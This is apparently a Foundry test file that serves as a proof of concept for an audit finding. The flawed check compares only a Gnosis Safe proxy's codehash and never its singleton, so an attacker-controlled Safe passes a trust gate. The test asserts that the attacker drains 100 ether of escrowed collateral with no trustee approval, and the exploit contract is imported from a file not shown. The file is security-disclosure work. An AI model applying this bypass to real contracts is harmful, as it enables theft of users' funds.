// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, IPSeedTrust, GnosisSafeProxy, MaliciousSafeSingleton, MiniToken} from "./36310-c-01-withdrawing-collateral-and-fees-and-bypassing-trust-saf.sol";

// Catalyst C-01 (finding 36310): checkIfBeneficiaryIsATrustedSafe only compares the
// Safe PROXY codehash, never the singleton behind it. A genuine v1.3.0 proxy over a
// malicious singleton (same codehash) passes the 2/2 trust gate while the attacker
// solely controls it, letting them drain the project's escrowed collateral with no
// protocolTrustee approval.
contract Finding36310Test is Test {
    function test_exploit_maliciousSingletonBypassesTrust_drainsCollateral() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("collateral drained (profit)", e.profit());
        emit log_named_uint("trustee approvals", e.trusteeApprovals());
        emit log_named_bytes32("honest proxy codehash", address(e.refProxy()).codehash);
        emit log_named_bytes32("malicious proxy codehash", address(e.beneficiary()).codehash);

        // same codehash for the honest and the malicious safe proxy
        assertEq(address(e.beneficiary()).codehash, address(e.refProxy()).codehash, "codehash differs");
        // attacker drained the full 100e18 escrow with no trustee signature
        assertEq(e.profit(), 100 ether, "attacker did not drain the collateral");
        assertEq(e.trusteeApprovals(), 0, "trustee approval was required");
        assertEq(MiniToken(address(e.token())).balanceOf(address(e.vuln())), 0, "escrow not drained");
    }
}
